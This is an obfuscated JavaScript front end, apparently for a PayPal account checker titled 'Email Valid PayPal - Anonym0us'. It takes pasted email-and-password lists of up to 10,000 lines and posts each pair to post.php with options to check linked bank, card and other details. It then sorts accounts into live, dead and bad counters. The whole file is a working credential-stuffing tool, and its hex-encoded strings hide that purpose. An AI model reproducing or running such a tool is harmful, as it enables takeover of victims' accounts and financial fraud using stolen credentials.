var _0x4d69 = ["\x72\x65\x6D\x6F\x76\x65", "\x70\x72\x6F\x74\x6F\x74\x79\x70\x65", "\x69\x6E\x64\x65\x78\x4F\x66", "\x73\x70\x6C\x69\x63\x65", "\x64\x69\x73\x61\x62\x6C\x65\x64", "\x61\x74\x74\x72", "\x23\x6C\x69\x73\x74\x64\x61\x74\x61", "\x68\x74\x6D\x6C", "", "\x73\x72\x63", "\x2E\x2E\x2F\x69\x6D\x61\x67\x65\x73\x2F\x63\x6C\x65\x61\x72\x2E\x67\x69\x66", "\x23\x6C\x6F\x61\x64\x69\x6E\x67", "\x23\x63\x68\x65\x63\x6B\x53\x74\x61\x74\x75\x73", "\x43\x68\x65\x63\x6B\x69\x6E\x67", "\x53\x74\x6F\x70\x70\x65\x64", "\x72\x65\x70\x6C\x61\x63\x65", "\x23\x73\x75\x62\x6D\x69\x74", "\x23\x73\x74\x6F\x70", "\x44\x6F\x6E\x65", "\x61\x62\x6F\x72\x74", "\x45\x6d\x61\x69\x6c\x20\x56\x61\x6c\x69\x64\x20\x50\x61\x79\x50\x61\x6c\x20\x2d\x20\x41\x6e\x6f\x6e\x79\x6d\x30\x75\x73", "\x30", "\x23\x68\x69\x74\x75\x6E\x67\x5F\x63\x68\x65\x63\x6B\x65\x64", "\x74\x69\x74\x6C\x65", "\x0A", "\x73\x70\x6C\x69\x74", "\x76\x61\x6C", "\x6A\x6F\x69\x6E", "\x6C\x65\x6E\x67\x74\x68", "\x23\x68\x69\x74\x75\x6E\x67\x5F\x74\x6F\x74\x61\x6C", "Max 10000 List/Check", "\x70\x6F\x73\x74\x2E\x70\x68\x70", "\x6A\x73\x6F\x6E", "\x50\x4F\x53\x54", "\x72\x6F\x75\x6E\x64", "\x25\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x68\x65\x63\x6B\x65\x64", "\x68\x69\x67\x68\x6C\x69\x67\x68\x74", "\x23\x30\x30\x36\x44\x42\x30", "\x65\x66\x66\x65\x63\x74", "\x43\x68\x65\x63\x6B\x69\x6E\x67\x3A\x20", "\x2E\x2E\x2F\x69\x6D\x61\x67\x65\x73\x2F\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x67\x69\x66", "\x61\x6A\x61\x78\x3D\x31\x26\x64\x6F\x3D\x63\x68\x65\x63\x6B\x26\x6D\x61\x69\x6C\x70\x61\x73\x73\x3D", "\x26\x64\x65\x6C\x69\x6D\x3D", "\x26\x63\x65\x6B\x5F\x6D\x61\x69\x6C\x3D", "\x26\x63\x65\x6B\x5F\x62\x61\x6E\x6B\x3D", "\x26\x63\x65\x6B\x5F\x63\x61\x72\x64\x3D", "\x26\x63\x65\x6B\x5F\x73\x6D\x61\x72\x74\x3D", "\x26\x63\x65\x6B\x5F\x62\x6D\x6C\x74\x3D", "\x26\x63\x65\x6B\x5F\x69\x6E\x66\x6F\x3D", "\x23\x68\x69\x74\x75\x6E\x67\x5F\x77\x72\x6F\x6E\x67", "\x23\x46\x46\x46\x46\x46\x46", "\x6D\x73\x67", "\x3C\x62\x72\x20\x2F\x3E", "\x61\x70\x70\x65\x6E\x64", "\x23\x72\x65\x73\x75\x6C\x74\x5F\x77\x72\x6F\x6E\x67", "\x23\x68\x69\x74\x75\x6E\x67\x5F\x64\x69\x65", "\x23\x46\x46\x30\x30\x30\x30", "\x23\x72\x65\x73\x75\x6C\x74\x5F\x64\x69\x65", "\x23\x68\x69\x74\x75\x6E\x67\x5F\x62\x61\x64", "\x23\x46\x46\x41\x35\x30\x30", "\x23\x72\x65\x73\x75\x6C\x74\x5F\x62\x61\x64", "\x23\x68\x69\x74\x75\x6E\x67\x5F\x6C\x69\x76\x65", "\x23\x30\x30\x46\x46\x30\x30", "\x23\x72\x65\x73\x75\x6C\x74\x5F\x6C\x69\x76\x65", "\x65\x72\x72\x6F\x72", "\x61\x6A\x61\x78", "\x40", "\x74\x72\x69\x6D", "\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65", "\x70\x75\x73\x68", "\x7C", "\x63\x6C\x69\x63\x6B", "\x23\x64\x65\x6C\x69\x6D", "\x3A\x63\x68\x65\x63\x6B\x65\x64", "\x69\x73", "\x23\x63\x65\x6B\x5F\x65\x6D\x61\x69\x6C", "\x23\x63\x65\x6B\x5F\x62\x61\x6E\x6B", "\x23\x63\x65\x6B\x5F\x63\x61\x72\x64", "\x23\x63\x65\x6B\x5F\x73\x6D\x61\x72\x74", "\x23\x63\x65\x6B\x5F\x62\x6D\x6C\x74", "\x23\x63\x65\x6B\x5F\x69\x6E\x66\x6F", "\x4E\x6F\x20\x4D\x61\x69\x6C\x2F\x50\x61\x73\x73\x20\x66\x6F\x75\x6E\x64\x21", "\x73\x6C\x6F\x77", "\x73\x68\x6F\x77", "\x23\x72\x65\x73\x75\x6C\x74", "\x72\x65\x61\x64\x79"];
var ajaxCall;
Array[_0x4d69[1]][_0x4d69[0]] = function(_0xcfbcx2) {
    var _0xcfbcx3 = this[_0x4d69[2]](_0xcfbcx2);
    if (_0xcfbcx3 != -1) {
        this[_0x4d69[3]](_0xcfbcx3, 1);
    };
    return this;
};

function enableTextArea(_0xcfbcx5) {
    $(_0x4d69[6])[_0x4d69[5]](_0x4d69[4], _0xcfbcx5);
};

function up(_0xcfbcx7) {
    var _0xcfbcx8 = parseInt($(_0xcfbcx7)[_0x4d69[7]]());
    _0xcfbcx8++;
    $(_0xcfbcx7)[_0x4d69[7]](_0xcfbcx8 + _0x4d69[8]);
};

function stopLoading(_0xcfbcx5) {
    $(_0x4d69[11])[_0x4d69[5]](_0x4d69[9], _0x4d69[10]);
    var _0xcfbcxa = $(_0x4d69[12])[_0x4d69[7]]();
    $(_0x4d69[12])[_0x4d69[7]](_0xcfbcxa[_0x4d69[15]](_0x4d69[13], _0x4d69[14]));
    enableTextArea(false);
    $(_0x4d69[16])[_0x4d69[5]](_0x4d69[4], false);
    $(_0x4d69[17])[_0x4d69[5]](_0x4d69[4], true);
    if (_0xcfbcx5) {
        alert(_0x4d69[18]);
    } else {
        ajaxCall[_0x4d69[19]]();
    };
    updateTitle(_0x4d69[20]);
    $(_0x4d69[22])[_0x4d69[7]](_0x4d69[21]);
};

function updateTitle(_0xcfbcxa) {
    document[_0x4d69[23]] = _0xcfbcxa;
};

function updateTextBox(_0xcfbcxd) {
    var _0xcfbcxe = $(_0x4d69[6])[_0x4d69[26]]()[_0x4d69[25]](_0x4d69[24]);
    _0xcfbcxe[_0x4d69[0]](_0xcfbcxd);
    $(_0x4d69[6])[_0x4d69[26]](_0xcfbcxe[_0x4d69[27]](_0x4d69[24]));
};

function yeu0thibao(_0xcfbcx10, _0xcfbcx11, _0xcfbcx12, _0xcfbcx13, _0xcfbcx14, _0xcfbcx15, _0xcfbcx16, _0xcfbcx17, _0xcfbcx18, _0xcfbcx19) {
    if (_0xcfbcx10[_0x4d69[28]] < 1 || _0xcfbcx11 >= _0xcfbcx10[_0x4d69[28]]) {
        stopLoading(true);
        return false;
    };
    if ($(_0x4d69[29])[_0x4d69[7]]() > 10000) {
        $(_0x4d69[29])[_0x4d69[7]](0);
        alert(_0x4d69[30]);
        stopLoading(true);
        return false;
    };
    updateTextBox(_0xcfbcx10[_0xcfbcx11]);
    ajaxCall = $[_0x4d69[65]]({
        url: _0x4d69[31],
        dataType: _0x4d69[32],
        cache: false,
        type: _0x4d69[33],
        beforeSend: function(_0xcfbcx1a) {
            updateTitle(Math[_0x4d69[34]](parseFloat(($(_0x4d69[22])[_0x4d69[7]]()) * 100) / parseFloat($(_0x4d69[29])[_0x4d69[7]]())) + _0x4d69[35]);
            $(_0x4d69[12])[_0x4d69[7]](_0x4d69[39] + _0xcfbcx10[_0xcfbcx11])[_0x4d69[38]](_0x4d69[36], {
                color: _0x4d69[37]
            }, 700);
            $(_0x4d69[11])[_0x4d69[5]](_0x4d69[9], _0x4d69[40]);
        },
        data: _0x4d69[41] + encodeURIComponent(_0xcfbcx10[_0xcfbcx11]) + _0x4d69[42] + encodeURIComponent(_0xcfbcx12) + _0x4d69[43] + _0xcfbcx13 + _0x4d69[44] + _0xcfbcx14 + _0x4d69[45] + _0xcfbcx15 + _0x4d69[46] + _0xcfbcx16 + _0x4d69[47] + _0xcfbcx17 + _0x4d69[48] + _0xcfbcx18,
        success: function(_0xcfbcx1b) {
            $(_0x4d69[22])[_0x4d69[7]]();
            switch (_0xcfbcx1b[_0x4d69[64]]) {
                case -1:
                    _0xcfbcx11++;
                    $(_0x4d69[49])[_0x4d69[7]]();
                    $(_0x4d69[54])[_0x4d69[53]](_0xcfbcx1b[_0x4d69[51]] + _0x4d69[52])[_0x4d69[38]](_0x4d69[36], {
                        color: _0x4d69[50]
                    }, 700);
                    up(_0x4d69[49]);
                    break;;
                case 1:
                    ;
                case 2:
                    _0xcfbcx11++;
                    $(_0x4d69[55])[_0x4d69[7]]();
                    $(_0x4d69[57])[_0x4d69[53]](_0xcfbcx1b[_0x4d69[51]] + _0x4d69[52])[_0x4d69[38]](_0x4d69[36], {
                        color: _0x4d69[56]
                    }, 700);
                    up(_0x4d69[55]);
                    _0xcfbcx19++;
                    break;;
                case 3:
                    _0xcfbcx11++;
                    $(_0x4d69[58])[_0x4d69[7]]();
                    $(_0x4d69[60])[_0x4d69[53]](_0xcfbcx1b[_0x4d69[51]] + _0x4d69[52])[_0x4d69[38]](_0x4d69[36], {
                        color: _0x4d69[59]
                    }, 700);
                    up(_0x4d69[58]);
                    _0xcfbcx19++;
                    break;;
                case 0:
                    _0xcfbcx11++;
                    $(_0x4d69[61])[_0x4d69[7]]();
                    $(_0x4d69[63])[_0x4d69[53]](_0xcfbcx1b[_0x4d69[51]] + _0x4d69[52])[_0x4d69[38]](_0x4d69[36], {
                        color: _0x4d69[62]
                    }, 700);
                    up(_0x4d69[61]);
                    break;;
            };
            up(_0x4d69[22]);
            yeu0thibao(_0xcfbcx10, _0xcfbcx11, _0xcfbcx12, _0xcfbcx13, _0xcfbcx14, _0xcfbcx15, _0xcfbcx16, _0xcfbcx17, _0xcfbcx18, _0xcfbcx19);
        }
    });
    return true;
};

function filterMP(_0xcfbcxd, _0xcfbcx12) {
    var _0xcfbcx1d = _0xcfbcxd[_0x4d69[25]](_0x4d69[24]);
    var _0xcfbcx1e = new Array();
    var _0xcfbcx10 = new Array();
    $(_0x4d69[29])[_0x4d69[7]]();
    for (var _0xcfbcx1f = 0; _0xcfbcx1f < _0xcfbcx1d[_0x4d69[28]]; _0xcfbcx1f++) {
        if (_0xcfbcx1d[_0xcfbcx1f][_0x4d69[2]](_0x4d69[66]) != -1) {
            var _0xcfbcx20 = _0xcfbcx1d[_0xcfbcx1f][_0x4d69[25]](_0xcfbcx12);
            for (var _0xcfbcx21 = 0; _0xcfbcx21 < _0xcfbcx20[_0x4d69[28]]; _0xcfbcx21++) {
                if (_0xcfbcx20[_0xcfbcx21][_0x4d69[2]](_0x4d69[66]) != -1) {
                    var _0xcfbcx22 = $[_0x4d69[67]](_0xcfbcx20[_0xcfbcx21]);
                    var _0xcfbcx23 = $[_0x4d69[67]](_0xcfbcx20[_0xcfbcx21 + 1]);
                    if (_0xcfbcx1e[_0x4d69[2]](_0xcfbcx22[_0x4d69[68]]()) == -1) {
                        _0xcfbcx1e[_0x4d69[69]](_0xcfbcx22[_0x4d69[68]]());
                        _0xcfbcx10[_0x4d69[69]](_0xcfbcx22 + _0x4d69[70] + _0xcfbcx23);
                        up(_0x4d69[29]);
                        break;
                    };
                };
            };
        };
    };
    return _0xcfbcx10;
};
$(document)[_0x4d69[85]](function() {
    $(_0x4d69[17])[_0x4d69[5]](_0x4d69[4], true)[_0x4d69[71]](function() {
        stopLoading(false);
    });
    $(_0x4d69[16])[_0x4d69[71]](function() {
        var _0xcfbcx12 = $(_0x4d69[72])[_0x4d69[26]]()[_0x4d69[67]]();
        var _0xcfbcxe = filterMP($(_0x4d69[6])[_0x4d69[26]](), _0xcfbcx12);
        var _0xcfbcx24 = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
        var _0xcfbcx13 = $(_0x4d69[75])[_0x4d69[74]](_0x4d69[73]) ? 1 : 0;
        var _0xcfbcx14 = $(_0x4d69[76])[_0x4d69[74]](_0x4d69[73]) ? 1 : 0;
        var _0xcfbcx15 = $(_0x4d69[77])[_0x4d69[74]](_0x4d69[73]) ? 1 : 0;
        var _0xcfbcx16 = $(_0x4d69[78])[_0x4d69[74]](_0x4d69[73]) ? 1 : 0;
        var _0xcfbcx17 = $(_0x4d69[79])[_0x4d69[74]](_0x4d69[73]) ? 1 : 0;
        var _0xcfbcx18 = $(_0x4d69[80])[_0x4d69[74]](_0x4d69[73]) ? 1 : 0;
        var _0xcfbcx19 = 0;
        if ($(_0x4d69[6])[_0x4d69[26]]()[_0x4d69[67]]() == _0x4d69[8]) {
            alert(_0x4d69[81]);
            return false;
        };
        $(_0x4d69[6])[_0x4d69[26]](_0xcfbcxe[_0x4d69[27]](_0x4d69[24]))[_0x4d69[5]](_0x4d69[4], true);
        $(_0x4d69[84])[_0x4d69[83]](_0x4d69[82]);
        $(_0x4d69[16])[_0x4d69[5]](_0x4d69[4], true);
        $(_0x4d69[17])[_0x4d69[5]](_0x4d69[4], false);
        yeu0thibao(_0xcfbcxe, 0, _0xcfbcx12, _0xcfbcx13, _0xcfbcx14, _0xcfbcx15, _0xcfbcx16, _0xcfbcx17, _0xcfbcx18, 0);
        return false;
    });
});